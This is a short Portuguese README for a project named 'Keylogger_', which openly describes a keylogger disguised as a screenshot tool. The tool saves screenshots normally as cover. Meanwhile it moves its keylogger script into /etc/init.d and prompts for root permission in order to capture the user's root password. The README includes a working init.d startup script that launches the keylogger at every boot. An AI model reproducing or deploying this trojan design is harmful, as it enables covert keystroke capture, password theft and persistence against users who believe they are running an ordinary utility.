# Keylogger_
Um keylogger que se disfarça de um app que tira print da tela.



Este programa captura o print da tela e salva ,normalmente, na pasta Pictures, como se fosse um programa de print comum<br>
Mas, ele também move o script Configuration.py, o keylogger, para a pasta init.d<br>
Além disso, ele requisita a permissão do usuário para executá-lo como root, desse modo, ele pega a senha root do usuário<br>
E, com isso, pode movê-lo para pastas que não se teria permissão.<br>
Mas, para funcionar corretamente, é necessário executá-lo sempre ao iniciar o computador.
<br><br>

<h2>Uso</h2>
<b>Primeiro, configurar arquivo,pode-se movê-lo, automáticamente com o python:</b><br>
O tipo de script para colocar na pasta etc/init.d/, para iniciá-lo:<br><br>
 #! /bin/sh
# /etc/init.d/example
 
case "$1" in<br>
  start)<br>
    echo ""<br>
    # run application you want to start<br>
    python /etc/init.d/configuration.py &<br>
    ;;<br>
  stop)<br>
    echo ""<br>
    # kill application you want to stop<br>
    killall python<br>
    ;;<br>
  *)<br>
    echo "Usage: /etc/init.d/example{start|stop}"<br>
    exit 1<br>
    ;;<br>
esac<br>
 
exit 0****<br>
<br>
<b>Dar a permissão:</b>
sudo chmod 755 example



